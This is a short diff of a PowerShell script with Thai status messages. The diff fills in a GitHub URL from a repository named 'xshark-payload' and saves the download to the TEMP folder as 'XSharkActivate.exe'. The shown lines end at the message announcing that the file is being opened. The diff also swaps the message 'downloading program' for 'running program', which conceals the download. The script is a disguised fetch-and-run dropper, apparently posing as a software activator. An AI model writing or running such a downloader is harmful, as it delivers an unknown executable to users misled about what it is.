@@ -1,7 +1,7 @@
-$url = "วางลิงก์ดาวน์โหลด_EXE_ของคุณตรงนี้"
+$url = "https://github.com/puppup3336-lab/xshark-payload/releases/tag/V1.0"
 $dest = "$env:TEMP\XSharkActivate.exe"
 
-Write-Host "กำลังดาวน์โหลดโปรแกรม..." -ForegroundColor Cyan
+Write-Host "กำลังเรียกใช้โปรแกรม..." -ForegroundColor Cyan
 Invoke-WebRequest -Uri $url -OutFile $dest
 
 Write-Host "กำลังเปิดโปรแกรม..." -ForegroundColor Green
